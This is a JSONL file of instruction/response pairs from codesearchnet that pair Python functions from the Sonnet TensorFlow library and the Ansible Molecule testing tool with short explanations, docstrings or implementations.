{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _nested_unary_mul(nested_a, p):\n  def mul_with_broadcast(tensor):\n    ndims = tensor.shape.ndims\n    if ndims != 2:\n      p_reshaped = tf.reshape(p, [-1] + [1] * (ndims - 1))\n      return p_reshaped * tensor\n    else:\n      return p * tensor\n  return nest.map(mul_with_broadcast, nested_a)", "response": "Multiply Tensors in arbitrarily nested Tensor nested_a with p."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _cond(self, unused_x, unused_cumul_out, unused_prev_state,\n            unused_cumul_state, cumul_halting, unused_iteration,\n            unused_remainder):\n    \"\"\"The `cond` of the `tf.while_loop`.\"\"\"\n    return tf.reduce_any(cumul_halting < 1)", "response": "The cond of the tf. while_loop."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nconnecting the core to the graph.", "response": "def _build(self, x, prev_state):\n    \"\"\"Connects the core to the graph.\n\n    Args:\n      x: Input `Tensor` of shape `(batch_size, input_size)`.\n      prev_state: Previous state. This could be a `Tensor`, or a tuple of\n          `Tensor`s.\n\n    Returns:\n      The tuple `(output, state)` for this core.\n\n    Raises:\n      ValueError: if the `Tensor` `x` does not have rank 2.\n    \"\"\"\n    x.get_shape().with_rank(2)\n    self._batch_size = x.get_shape().as_list()[0]\n    self._dtype = x.dtype\n\n    x_zeros = tf.concat(\n        [x, tf.zeros(\n            shape=(self._batch_size, 1), dtype=self._dtype)], 1)\n    x_ones = tf.concat(\n        [x, tf.ones(\n            shape=(self._batch_size, 1), dtype=self._dtype)], 1)\n    # Weights for the halting signal\n    halting_linear = basic.Linear(name=\"halting_linear\", output_size=1)\n\n    body = functools.partial(\n        self._body, halting_linear=halting_linear, x_ones=x_ones)\n    cumul_halting_init = tf.zeros(shape=(self._batch_size, 1),\n                                  dtype=self._dtype)\n    iteration_init = tf.zeros(shape=(self._batch_size, 1), dtype=self._dtype)\n    core_output_size = [x.value for x in self._core.output_size]\n    out_init = tf.zeros(shape=(self._batch_size,) + tuple(core_output_size),\n                        dtype=self._dtype)\n    cumul_state_init = _nested_zeros_like(prev_state)\n    remainder_init = tf.zeros(shape=(self._batch_size, 1), dtype=self._dtype)\n    (unused_final_x, final_out, unused_final_state, final_cumul_state,\n     unused_final_halting, final_iteration, final_remainder) = tf.while_loop(\n         self._cond, body, [x_zeros, out_init, prev_state, cumul_state_init,\n                            cumul_halting_init, iteration_init, remainder_init])\n\n    act_output = basic.Linear(\n        name=\"act_output_linear\", output_size=self._output_size)(final_out)\n\n    return (act_output, (final_iteration, final_remainder)), final_cumul_state"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef restore_initializer(filename, name_fn=None,\n                        collection=tf.GraphKeys.GLOBAL_VARIABLES):\n  \"\"\"Custom getter to restore all variables with `snt.restore_initializer`.\n\n  Args:\n    filename: The filename of the checkpoint.\n    name_fn: A function which can map the name of the variable requested. This\n      allows restoring variables with values having different names in the\n      checkpoint.\n    collection: Only set the restore initializer for variables in this\n      collection. If `None`, it will attempt to restore all variables. By\n      default `tf.GraphKeys.GLOBAL_VARIABLES`.\n\n  Returns:\n    A restore_initializer custom getter, which is a function taking arguments\n    (getter, name, *args, **kwargs).\n  \"\"\"\n\n  def _restore_initializer(getter, name, *args, **kwargs):\n    \"\"\"Gets variable with restore initializer.\"\"\"\n\n    # Work out what collections this variable will go in.\n    collections = kwargs[\"collections\"]\n    if collections is None:\n      collections = [tf.GraphKeys.GLOBAL_VARIABLES]\n\n    if (kwargs[\"trainable\"]\n        and tf.GraphKeys.TRAINABLE_VARIABLES not in collections):\n      collections += [tf.GraphKeys.TRAINABLE_VARIABLES]\n\n    if collection is None or collection in collections:\n      # We don't make use of the 'scope' argument for restore_initializer as we\n      # might want to change the name in more complex ways, such as removing the\n      # scope prefix as well.\n      if name_fn is not None:\n        var_name_in_checkpoint = name_fn(name)\n      else:\n        var_name_in_checkpoint = name\n\n      tf.logging.info(\"Restoring '%s' from '%s' into variable '%s'\",\n                      var_name_in_checkpoint,\n                      filename,\n                      name)\n\n      kwargs[\"initializer\"] = snt.restore_initializer(\n          filename, var_name_in_checkpoint, scope=\"\")\n\n    return getter(name, *args, **kwargs)\n\n  return _restore_initializer", "response": "Custom getter to restore all variables with snt. restore_initializer."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _embedding_dim(vocab_size):\n  if not vocab_size or (vocab_size <= 0):\n    raise ValueError(\"Invalid vocab_size %g.\" % vocab_size)\n  return int(round(6.0 * math.sqrt(math.sqrt(vocab_size))))", "response": "Calculate a reasonable embedding size for a vocabulary."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _build(self, ids):\n    # Construct embeddings.\n    if self._existing_vocab is None:\n      if self.EMBEDDINGS not in self._initializers:\n        self._initializers[self.EMBEDDINGS] = tf.initializers.random_normal()\n      self._embeddings = tf.get_variable(\n          \"embeddings\",\n          shape=[self._vocab_size, self._embed_dim],\n          dtype=tf.float32,\n          initializer=self._initializers[self.EMBEDDINGS],\n          partitioner=self._partitioners.get(self.EMBEDDINGS, None),\n          regularizer=self._regularizers.get(self.EMBEDDINGS, None),\n          trainable=self._trainable)\n    else:\n      self._embeddings = tf.get_variable(\n          \"embeddings\",\n          dtype=tf.float32,\n          initializer=self._existing_vocab,\n          regularizer=self._regularizers.get(self.EMBEDDINGS, None),\n          trainable=self._trainable)\n\n    if self._densify_gradients:\n      # On the backwards pass, we convert the gradient from indexed-slices to a\n      # regular tensor before sending it back to the parameter server.\n      # This avoids excess computation on the parameter server.\n      # In eager mode we do not need the conversion.\n      # Add a check whether we are in eager mode when it is supported.\n      embeddings = util.convert_gradient_to_tensor(self._embeddings)\n    else:\n      embeddings = self._embeddings\n\n    # Lookup embeddings\n    return tf.nn.embedding_lookup(embeddings, ids, name=\"embedding_lookup\")", "response": "Builds the lookup embeddings."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _create_affine_features(output_shape, source_shape):\n  ranges = [np.linspace(-1, 1, x, dtype=np.float32)\n            for x in reversed(output_shape)]\n  psi = [x.reshape(-1) for x in np.meshgrid(*ranges, indexing='xy')]\n  dim_gap = len(source_shape) - len(output_shape)\n  for _ in xrange(dim_gap):\n    psi.append(np.zeros_like(psi[0], dtype=np.float32))\n  psi.append(np.ones_like(psi[0], dtype=np.float32))\n  return psi", "response": "Generates n - dimensional homogenous coordinates for a given source and output grids."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _create_features(self, constraints):\n    affine_warp_constraints = constraints\n    if not isinstance(affine_warp_constraints, AffineWarpConstraints):\n      affine_warp_constraints = AffineWarpConstraints(affine_warp_constraints)\n    mask = affine_warp_constraints.mask\n    psi = _create_affine_features(output_shape=self._output_shape,\n                                  source_shape=self._source_shape)\n    scales = [(x - 1.0) * .5 for x in reversed(self._source_shape)]\n    offsets = scales\n    # Transforming a point x's i-th coordinate via an affine transformation\n    # is performed via the following dot product:\n    #\n    #  x_i' = s_i * (T_i * x) + t_i                                          (1)\n    #\n    # where Ti is the i-th row of an affine matrix, and the scalars s_i and t_i\n    # define a decentering and global scaling into the source space.\n    # In the AffineGridWarper some of the entries of Ti are provided via the\n    # input, some others are instead fixed, according to the constraints\n    # assigned in the constructor.\n    # In create_features the internal dot product (1) is accordingly broken down\n    # into two parts:\n    #\n    # x_i' = Ti[uncon_i] * x[uncon_i, :] + offset(con_var)                   (2)\n    #\n    # i.e. the sum of the dot product of the free parameters (coming\n    # from the input) indexed by uncond_i and an offset obtained by\n    # precomputing the fixed part of (1) according to the constraints.\n    # This step is implemented by analyzing row by row the constraints matrix\n    # and saving into a list the x[uncon_i] and offset(con_var) data matrices\n    # for each output dimension.\n    features = []\n    for row, scale in zip(mask, scales):\n      x_i = np.array([x for x, is_active in zip(psi, row) if is_active])\n      features.append(x_i * scale if len(x_i) else None)\n\n    for row_i, row in enumerate(mask):\n      x_i = None\n      s = scales[row_i]\n      for i, is_active in enumerate(row):\n        if is_active:\n          continue\n\n        # In principle a whole row of the affine matrix can be fully\n        # constrained. In that case the corresponding dot product between input\n        # parameters and grid coordinates doesn't need to be implemented in the\n        # computation graph since it can be precomputed.\n        # When a whole row if constrained, x_i - which is initialized to\n        # None - will still be None at the end do the loop when it is appended\n        # to the features list; this value is then used to detect this setup\n        # in the build function where the graph is assembled.\n        if x_i is None:\n          x_i = np.array(psi[i]) * affine_warp_constraints[row_i][i] * s\n        else:\n          x_i += np.array(psi[i]) * affine_warp_constraints[row_i][i] * s\n      features.append(x_i)\n\n    features += offsets\n    return features", "response": "Creates all the matrices needed to compute the output warped grids."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _build(self, inputs):\n    input_shape = tf.shape(inputs)\n    input_dtype = inputs.dtype.as_numpy_dtype\n    batch_size = tf.expand_dims(input_shape[0], 0)\n    number_of_params = inputs.get_shape()[1]\n    if number_of_params != self._constraints.num_free_params:\n      raise base.Error('Input size is not consistent with constraint '\n                       'definition: {} parameters expected, {} provided.'\n                       .format(self._constraints.num_free_params,\n                               number_of_params))\n    num_output_dimensions = len(self._psi) // 3\n    def get_input_slice(start, size):\n      \"\"\"Extracts a subset of columns from the input 2D Tensor.\"\"\"\n      return basic.SliceByDim([1], [start], [size])(inputs)\n\n    warped_grid = []\n    var_index_offset = 0\n    number_of_points = np.prod(self._output_shape)\n    for i in xrange(num_output_dimensions):\n      if self._psi[i] is not None:\n        # The i-th output dimension is not fully specified by the constraints,\n        # the graph is setup to perform matrix multiplication in batch mode.\n        grid_coord = self._psi[i].astype(input_dtype)\n\n        num_active_vars = self._psi[i].shape[0]\n        active_vars = get_input_slice(var_index_offset, num_active_vars)\n        warped_coord = tf.matmul(active_vars, grid_coord)\n        warped_coord = tf.expand_dims(warped_coord, 1)\n        var_index_offset += num_active_vars\n        offset = self._psi[num_output_dimensions + i]\n        if offset is not None:\n          offset = offset.astype(input_dtype)\n          # Some entries in the i-th row of the affine matrix were constrained\n          # and the corresponding matrix multiplications have been precomputed.\n          tiling_params = tf.concat(\n              [\n                  batch_size, tf.constant(\n                      1, shape=(1,)), tf.ones_like(offset.shape)\n              ],\n              0)\n          offset = offset.reshape((1, 1) + offset.shape)\n          warped_coord += tf.tile(offset, tiling_params)\n\n      else:\n        # The i-th output dimension is fully specified by the constraints, and\n        # the corresponding matrix multiplications have been precomputed.\n        warped_coord = self._psi[num_output_dimensions + i].astype(input_dtype)\n        tiling_params = tf.concat(\n            [\n                batch_size, tf.constant(\n                    1, shape=(1,)), tf.ones_like(warped_coord.shape)\n            ],\n            0)\n        warped_coord = warped_coord.reshape((1, 1) + warped_coord.shape)\n        warped_coord = tf.tile(warped_coord, tiling_params)\n\n      warped_coord += self._psi[i + 2 * num_output_dimensions]\n      # Need to help TF figuring out shape inference since tiling information\n      # is held in Tensors which are not known until run time.\n      warped_coord.set_shape([None, 1, number_of_points])\n      warped_grid.append(warped_coord)\n\n    # Reshape all the warped coordinates tensors to match the specified output\n    # shape and concatenate  into a single matrix.\n    grid_shape = self._output_shape + (1,)\n    warped_grid = [basic.BatchReshape(grid_shape)(grid) for grid in warped_grid]\n    return tf.concat(warped_grid, len(grid_shape))", "response": "Builds the internal module network."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef inverse(self, name=None):\n    if self._num_coeff != 6:\n      raise tf.errors.UnimplementedError('AffineGridWarper currently supports'\n                                         'inversion only for the 2D case.')\n    def _affine_grid_warper_inverse(inputs):\n      \"\"\"Assembles network to compute inverse affine transformation.\n\n      Each `inputs` row potentially contains [a, b, tx, c, d, ty]\n      corresponding to an affine matrix:\n\n        A = [a, b, tx],\n            [c, d, ty]\n\n      We want to generate a tensor containing the coefficients of the\n      corresponding inverse affine transformation in a constraints-aware\n      fashion.\n      Calling M:\n\n        M = [a, b]\n            [c, d]\n\n      the affine matrix for the inverse transform is:\n\n         A_in = [M^(-1), M^-1 * [-tx, -tx]^T]\n\n      where\n\n        M^(-1) = (ad - bc)^(-1) * [ d, -b]\n                                  [-c,  a]\n\n      Args:\n        inputs: Tensor containing a batch of transformation parameters.\n\n      Returns:\n        A tensorflow graph performing the inverse affine transformation\n        parametrized by the input coefficients.\n      \"\"\"\n      batch_size = tf.expand_dims(tf.shape(inputs)[0], 0)\n      constant_shape = tf.concat([batch_size, tf.convert_to_tensor((1,))], 0)\n\n      index = iter(range(6))\n      def get_variable(constraint):\n        if constraint is None:\n          i = next(index)\n          return inputs[:, i:i+1]\n        else:\n          return tf.fill(constant_shape, tf.constant(constraint,\n                                                     dtype=inputs.dtype))\n\n      constraints = chain.from_iterable(self.constraints)\n      a, b, tx, c, d, ty = (get_variable(constr) for constr in constraints)\n\n      det = a * d - b * c\n      a_inv = d / det\n      b_inv = -b / det\n      c_inv = -c / det\n      d_inv = a / det\n\n      m_inv = basic.BatchReshape(\n          [2, 2])(tf.concat([a_inv, b_inv, c_inv, d_inv], 1))\n\n      txy = tf.expand_dims(tf.concat([tx, ty], 1), 2)\n\n      txy_inv = basic.BatchFlatten()(tf.matmul(m_inv, txy))\n      tx_inv = txy_inv[:, 0:1]\n      ty_inv = txy_inv[:, 1:2]\n\n      inverse_gw_inputs = tf.concat(\n          [a_inv, b_inv, -tx_inv, c_inv, d_inv, -ty_inv], 1)\n\n      agw = AffineGridWarper(self.output_shape,\n                             self.source_shape)\n\n\n      return agw(inverse_gw_inputs)  # pylint: disable=not-callable\n\n    if name is None:\n      name = self.module_name + '_inverse'\n    return base.Module(_affine_grid_warper_inverse, name=name)", "response": "Returns a sonnet module that performs the inverse affine transformation of a reference set of points."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncompute a boolean mask from the user defined constraints.", "response": "def _calc_mask(self):\n    \"\"\"Computes a boolean mask from the user defined constraints.\"\"\"\n    mask = []\n    for row in self._constraints:\n      mask.append(tuple(x is None for x in row))\n    return tuple(mask)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _combine(self, x, y):\n    if x is None or y is None:\n      return x or y\n    if x != y:\n      raise ValueError('Incompatible set of constraints provided.')\n    return x", "response": "Combines two constraints raising an error if they are not compatible."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncombine two sets of constraints into a coherent single set.", "response": "def combine_with(self, additional_constraints):\n    \"\"\"Combines two sets of constraints into a coherent single set.\"\"\"\n    x = additional_constraints\n    if not isinstance(additional_constraints, AffineWarpConstraints):\n      x = AffineWarpConstraints(additional_constraints)\n    new_constraints = []\n    for left, right in zip(self._constraints, x.constraints):\n      new_constraints.append([self._combine(x, y) for x, y in zip(left, right)])\n    return AffineWarpConstraints(new_constraints)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _partition_spec(self, shape, partition_info):\n    if partition_info is None:\n      return ''  # Empty string indicates a non-partitioned tensor.\n    ssi = tf.Variable.SaveSliceInfo(\n        full_name=self._var_name,\n        full_shape=partition_info.full_shape,\n        var_offset=partition_info.var_offset,\n        var_shape=shape)\n    return ssi.spec", "response": "Build magic ( and sparsely documented ) shapes_and_slices spec string."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef bake(self):\n        # Pass a directory as inventory to let Ansible merge the multiple\n        # inventory sources located under\n        self.add_cli_arg('inventory',\n                         self._config.provisioner.inventory_directory)\n        options = util.merge_dicts(self._config.provisioner.options, self._cli)\n        verbose_flag = util.verbose_flag(options)\n        if self._playbook != self._config.provisioner.playbooks.converge:\n            if options.get('become'):\n                del options['become']\n\n        self._ansible_command = sh.ansible_playbook.bake(\n            options,\n            self._playbook,\n            *verbose_flag,\n            _cwd=self._config.scenario.directory,\n            _env=self._env,\n            _out=self._out,\n            _err=self._err)\n\n        ansible_args = (list(self._config.provisioner.ansible_args) + list(\n            self._config.ansible_args))\n\n        if ansible_args:\n            if self._config.action not in ['create', 'destroy']:\n                self._ansible_command = self._ansible_command.bake(\n                    ansible_args)", "response": "Bake an ansible - playbook command so it s ready to execute and\n        returns None."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef execute(self):\n        if self._ansible_command is None:\n            self.bake()\n\n        try:\n            self._config.driver.sanity_checks()\n            cmd = util.run_command(\n                self._ansible_command, debug=self._config.debug)\n            return cmd.stdout.decode('utf-8')\n        except sh.ErrorReturnCode as e:\n            out = e.stdout.decode('utf-8')\n            util.sysexit_with_message(str(out), e.exit_code)", "response": "Executes ansible - playbook and returns a string."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef login(ctx, host, scenario_name):  # pragma: no cover\n    args = ctx.obj.get('args')\n    subcommand = base._get_subcommand(__name__)\n    command_args = {\n        'subcommand': subcommand,\n        'host': host,\n    }\n\n    s = scenarios.Scenarios(\n        base.get_configs(args, command_args), scenario_name)\n    for scenario in s.all:\n        base.execute_subcommand(scenario.config, subcommand)", "response": "Log in to one instance."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef execute(self):\n        c = self._config\n        if ((not c.state.created) and c.driver.managed):\n            msg = 'Instances not created.  Please create instances first.'\n            util.sysexit_with_message(msg)\n\n        hosts = [d['name'] for d in self._config.platforms.instances]\n        hostname = self._get_hostname(hosts)\n        self._get_login(hostname)", "response": "Execute the actions necessary to perform a molecule login and return None."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nexecutes all scenarios in the specified scenario_name in the command - line.", "response": "def execute_cmdline_scenarios(scenario_name, args, command_args):\n    \"\"\"\n    Execute scenario sequences based on parsed command-line arguments.\n\n    This is useful for subcommands that run scenario sequences, which\n    excludes subcommands such as ``list``, ``login``, and ``matrix``.\n\n    ``args`` and ``command_args`` are combined using :func:`get_configs`\n    to generate the scenario(s) configuration.\n\n    :param scenario_name: Name of scenario to run, or ``None`` to run all.\n    :param args: ``args`` dict from ``click`` command context\n    :param command_args: dict of command argumentss, including the target\n                         subcommand to execute\n    :returns: None\n\n    \"\"\"\n    scenarios = molecule.scenarios.Scenarios(\n        get_configs(args, command_args), scenario_name)\n    scenarios.print_matrix()\n    for scenario in scenarios:\n        try:\n            execute_scenario(scenario)\n        except SystemExit:\n            # if the command has a 'destroy' arg, like test does,\n            # handle that behavior here.\n            if command_args.get('destroy') == 'always':\n                msg = ('An error occurred during the {} sequence action: '\n                       \"'{}'. Cleaning up.\").format(scenario.config.subcommand,\n                                                    scenario.config.action)\n                LOG.warn(msg)\n                execute_subcommand(scenario.config, 'cleanup')\n                execute_subcommand(scenario.config, 'destroy')\n                # always prune ephemeral dir if destroying on failure\n                scenario.prune()\n                util.sysexit()\n            else:\n                raise"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef execute_scenario(scenario):\n\n    for action in scenario.sequence:\n        execute_subcommand(scenario.config, action)\n\n    # pruning only if a 'destroy' step was in the sequence allows for normal\n    # debugging by manually stepping through a scenario sequence\n    if 'destroy' in scenario.sequence:\n        scenario.prune()", "response": "Execute each command in the given scenario s configured sequence."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_configs(args, command_args, ansible_args=()):\n    configs = [\n        config.Config(\n            molecule_file=util.abs_path(c),\n            args=args,\n            command_args=command_args,\n            ansible_args=ansible_args,\n        ) for c in glob.glob(MOLECULE_GLOB)\n    ]\n    _verify_configs(configs)\n\n    return configs", "response": "Glob the current directory for Molecule config files instantiate config objects and return a list of config objects."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nverify that a Molecule config file was found and returns None.", "response": "def _verify_configs(configs):\n    \"\"\"\n    Verify a Molecule config was found and returns None.\n\n    :param configs: A list containing absolute paths to Molecule config files.\n    :return: None\n    \"\"\"\n    if configs:\n        scenario_names = [c.scenario.name for c in configs]\n        for scenario_name, n in collections.Counter(scenario_names).items():\n            if n > 1:\n                msg = (\"Duplicate scenario name '{}' found.  \"\n                       'Exiting.').format(scenario_name)\n                util.sysexit_with_message(msg)\n\n    else:\n        msg = \"'{}' glob failed.  Exiting.\".format(MOLECULE_GLOB)\n        util.sysexit_with_message(msg)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nbakes a gilt command so it s ready to execute and returns None.", "response": "def bake(self):\n        \"\"\"\n        Bake a ``gilt`` command so it's ready to execute and returns None.\n\n        :return: None\n        \"\"\"\n        self._sh_command = getattr(sh, self.command)\n        self._sh_command = self._sh_command.bake(\n            self.options,\n            'overlay',\n            _env=self.env,\n            _out=LOG.out,\n            _err=LOG.error)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef execute(self):\n        self.print_info()\n\n        if not self._config.provisioner.playbooks.cleanup:\n            msg = 'Skipping, cleanup playbook not configured.'\n            LOG.warn(msg)\n            return\n\n        self._config.provisioner.cleanup()", "response": "Execute the actions necessary to cleanup the instances and returns None."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef bake(self):\n        options = self.options\n        default_exclude_list = options.pop('default_exclude')\n        options_exclude_list = options.pop('exclude')\n        excludes = default_exclude_list + options_exclude_list\n        x_list = options.pop('x')\n\n        exclude_args = ['--exclude={}'.format(exclude) for exclude in excludes]\n        x_args = tuple(('-x', x) for x in x_list)\n        self._ansible_lint_command = sh.ansible_lint.bake(\n            options,\n            exclude_args,\n            sum(x_args, ()),\n            self._playbook,\n            _env=self.env,\n            _out=LOG.out,\n            _err=LOG.error)", "response": "Bake an ansible - lint command so it s ready to execute and returns\n        None."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef print_environment_vars(env):\n    ansible_env = {k: v for (k, v) in env.items() if 'ANSIBLE_' in k}\n    print_debug('ANSIBLE ENVIRONMENT', safe_dump(ansible_env))\n\n    molecule_env = {k: v for (k, v) in env.items() if 'MOLECULE_' in k}\n    print_debug('MOLECULE ENVIRONMENT', safe_dump(molecule_env))\n\n    combined_env = ansible_env.copy()\n    combined_env.update(molecule_env)\n    print_debug(\n        'SHELL REPLAY', \" \".join(\n            [\"{}={}\".format(k, v) for (k, v) in sorted(combined_env.items())]))\n    print()", "response": "Print the environment variables and returns None."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nexecute the given command and returns None.", "response": "def run_command(cmd, debug=False):\n    \"\"\"\n    Execute the given command and returns None.\n\n    :param cmd: A ``sh.Command`` object to execute.\n    :param debug: An optional bool to toggle debug output.\n    :return: ``sh`` object\n    \"\"\"\n    if debug:\n        # WARN(retr0h): Uses an internal ``sh`` data structure to dig\n        # the environment out of the ``sh.command`` object.\n        print_environment_vars(cmd._partial_call_args.get('env', {}))\n        print_debug('COMMAND', str(cmd))\n        print()\n    return cmd(_truncate_exc=False)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef write_file(filename, content):\n    with open_file(filename, 'w') as f:\n        f.write(content)\n\n    file_prepender(filename)", "response": "Writes a file with the given filename and content and returns None."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef safe_dump(data):\n    # TODO(retr0h): Do we need to encode?\n    # yaml.dump(data) produces the document as a str object in both python\n    # 2 and 3.\n    return yaml.dump(\n        data, Dumper=SafeDumper, default_flow_style=False, explicit_start=True)", "response": "Dump the provided data to a YAML document and returns a string."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef safe_load(string):\n    try:\n        return yaml.safe_load(string) or {}\n    except yaml.scanner.ScannerError as e:\n        sysexit_with_message(str(e))", "response": "Parse the provided string returns a dict."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef merge_dicts(a, b):\n    anyconfig.merge(a, b, ac_merge=MERGE_STRATEGY)\n\n    return a", "response": "Merges the values of B into A and returns a mutated dict A."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _validate_unique(self, unique, field, value):\n        if unique:\n            root_key = self.schema_path[0]\n            data = (doc[field] for doc in self.root_document[root_key])\n            for key, count in collections.Counter(data).items():\n                if count > 1:\n                    msg = \"'{}' is not unique\".format(key)\n                    self._error(field, msg)", "response": "Ensure value uniqueness.\n\n        The rule's arguments are validated against this schema:\n        {'type': 'boolean'}"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef execute(self):\n        self.print_info()\n        if not self._config.state.converged:\n            msg = 'Instances not converged.  Please converge instances first.'\n            util.sysexit_with_message(msg)\n\n        output = self._config.provisioner.converge(out=None, err=None)\n\n        idempotent = self._is_idempotent(output)\n        if idempotent:\n            msg = 'Idempotence completed successfully.'\n            LOG.success(msg)\n        else:\n            msg = ('Idempotence test failed because of the following tasks:\\n'\n                   u'{}').format('\\n'.join(self._non_idempotent_tasks(output)))\n            util.sysexit_with_message(msg)", "response": "Execute the actions necessary to perform a molecule idempotence and return None."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nparse the output of the ansible run and returns a bool.", "response": "def _is_idempotent(self, output):\n        \"\"\"\n        Parses the output of the provisioning for changed and returns a bool.\n\n        :param output: A string containing the output of the ansible run.\n        :return: bool\n        \"\"\"\n\n        # Remove blank lines to make regex matches easier\n        output = re.sub(r'\\n\\s*\\n*', '\\n', output)\n\n        # Look for any non-zero changed lines\n        changed = re.search(r'(changed=[1-9][0-9]*)', output)\n\n        if changed:\n            # Not idempotent\n            return False\n\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nparse the output of the ansible run to identify the non idempotent tasks.", "response": "def _non_idempotent_tasks(self, output):\n        \"\"\"\n        Parses the output to identify the non idempotent tasks.\n\n        :param (str) output: A string containing the output of the ansible run.\n        :return: A list containing the names of the non idempotent tasks.\n        \"\"\"\n        # Remove blank lines to make regex matches easier.\n        output = re.sub(r'\\n\\s*\\n*', '\\n', output)\n\n        # Remove ansi escape sequences.\n        output = util.strip_ansi_escape(output)\n\n        # Split the output into a list and go through it.\n        output_lines = output.split('\\n')\n        res = []\n        task_line = ''\n        for _, line in enumerate(output_lines):\n            if line.startswith('TASK'):\n                task_line = line\n            elif line.startswith('changed'):\n                host_name = re.search(r'\\[(.*)\\]', line).groups()[0]\n                task_name = re.search(r'\\[(.*)\\]', task_line).groups()[0]\n                res.append(u'* [{}] => {}'.format(host_name, task_name))\n\n        return res"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ninitializes a new scenario for use with Molecule.", "response": "def scenario(ctx, dependency_name, driver_name, lint_name, provisioner_name,\n             role_name, scenario_name, verifier_name):  # pragma: no cover\n    \"\"\" Initialize a new scenario for use with Molecule. \"\"\"\n    command_args = {\n        'dependency_name': dependency_name,\n        'driver_name': driver_name,\n        'lint_name': lint_name,\n        'provisioner_name': provisioner_name,\n        'role_name': role_name,\n        'scenario_name': scenario_name,\n        'subcommand': __name__,\n        'verifier_name': verifier_name,\n    }\n\n    if verifier_name == 'inspec':\n        command_args['verifier_lint_name'] = 'rubocop'\n\n    if verifier_name == 'goss':\n        command_args['verifier_lint_name'] = 'yamllint'\n\n    if verifier_name == 'ansible':\n        command_args['verifier_lint_name'] = 'ansible-lint'\n\n    s = Scenario(command_args)\n    s.execute()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef execute(self):\n        scenario_name = self._command_args['scenario_name']\n        role_name = os.getcwd().split(os.sep)[-1]\n        role_directory = util.abs_path(os.path.join(os.getcwd(), os.pardir))\n\n        msg = 'Initializing new scenario {}...'.format(scenario_name)\n        LOG.info(msg)\n        molecule_directory = config.molecule_directory(\n            os.path.join(role_directory, role_name))\n        scenario_directory = os.path.join(molecule_directory, scenario_name)\n        scenario_base_directory = os.path.dirname(scenario_directory)\n\n        if os.path.isdir(scenario_directory):\n            msg = ('The directory molecule/{} exists. '\n                   'Cannot create new scenario.').format(scenario_name)\n            util.sysexit_with_message(msg)\n\n        scenario_base_directory = os.path.join(role_directory, role_name)\n        templates = [\n            'scenario/driver/{driver_name}'.format(**self._command_args),\n            'scenario/verifier/{verifier_name}'.format(**self._command_args),\n        ]\n        for template in templates:\n            self._process_templates(template, self._command_args,\n                                    scenario_base_directory)\n        self._process_templates('molecule', self._command_args, role_directory)\n\n        role_directory = os.path.join(role_directory, role_name)\n        msg = 'Initialized scenario in {} successfully.'.format(\n            scenario_directory)\n        LOG.success(msg)", "response": "Execute the actions necessary to perform a molecule init scenario and return None."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef sanity_checks(self):\n\n        if self._config.state.sanity_checked:\n            return\n\n        log.info(\"Sanity checks: '{}'\".format(self._name))\n\n        HAS_DOCKER_PY = None\n        try:\n            from ansible.module_utils.docker_common import HAS_DOCKER_PY\n        except ImportError:\n\n            # ansible 2.8+\n            try:\n                from ansible.module_utils.docker.common import HAS_DOCKER_PY\n            except ImportError:\n                pass\n\n        if not HAS_DOCKER_PY:\n            msg = ('Missing Docker driver dependency. Please '\n                   \"install via 'molecule[docker]' or refer to \"\n                   'your INSTALL.rst driver documentation file')\n            sysexit_with_message(msg)\n\n        try:\n            import docker\n            import requests\n            docker_client = docker.from_env()\n            docker_client.ping()\n        except requests.exceptions.ConnectionError:\n            msg = ('Unable to contact the Docker daemon. '\n                   'Please refer to https://docs.docker.com/config/daemon/ '\n                   'for managing the daemon')\n            sysexit_with_message(msg)\n\n        self._config.state.change_state('sanity_checked', True)", "response": "Implement Docker driver sanity checks."}
